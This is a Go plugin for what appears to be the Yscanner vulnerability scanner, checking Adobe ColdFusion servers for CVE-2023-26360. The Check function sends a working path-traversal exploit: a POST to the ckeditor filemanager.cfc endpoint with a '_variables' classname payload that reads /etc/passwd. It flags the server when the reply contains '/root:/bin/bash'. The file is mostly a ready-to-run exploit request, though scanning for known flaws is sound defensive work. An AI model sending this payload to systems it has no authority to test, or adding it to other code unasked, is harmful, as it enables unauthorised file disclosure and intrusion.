package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"net/http"
	"strings"
)

func init() {
	Register("adobe_coldfusion_rce_cve_2023_26360", &adobe_coldfusion_rce_cve_2023_26360{})
}

type adobe_coldfusion_rce_cve_2023_26360 struct{}

func (p *adobe_coldfusion_rce_cve_2023_26360) Info() PluginInfo {
	return PluginInfo{
		Name:     "Adobe ColdFusion 不当访问控制漏洞",
		VulnInfo: "Adobe ColdFusion是一种用于构建动态Web应用程序的服务器端编程语言和开发平台。",
		VulnID:   "CVE-2023-26360",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "Adobe ColdFusion < 2018.0.16；Adobe ColdFusion < 2021.0.6",
		CWE:      "CWE-284	访问控制不恰当",
	}
}

func (p *adobe_coldfusion_rce_cve_2023_26360) Check(netloc string) bool {
	url := netloc + "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/filemanager.cfc?method=foo&_cfclient=true"
	payload := `_variables={"_metadata":{"classname":"../../../../../../../../../../../../../etc/passwd"}}`

	req, err := http.NewRequest("POST", url, bytes.NewBufferString(payload))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "/root:/bin/bash") {
		return true
	}
	return false
}
